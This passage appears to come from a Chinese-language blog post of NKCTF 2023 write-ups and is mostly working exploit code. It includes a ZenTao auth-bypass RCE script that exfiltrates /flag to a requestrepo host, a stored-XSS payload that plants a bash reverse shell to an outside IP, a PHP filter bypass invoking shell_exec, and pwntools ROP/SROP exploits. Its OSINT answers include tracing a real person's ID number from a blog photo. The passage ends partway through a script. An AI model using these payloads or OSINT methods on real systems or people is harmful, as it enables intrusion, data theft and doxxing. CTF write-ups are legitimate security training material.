&#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p><h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p><h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p><h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p><p>ctfshow的题目加上一些函数禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p><p>url编码后上传</p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 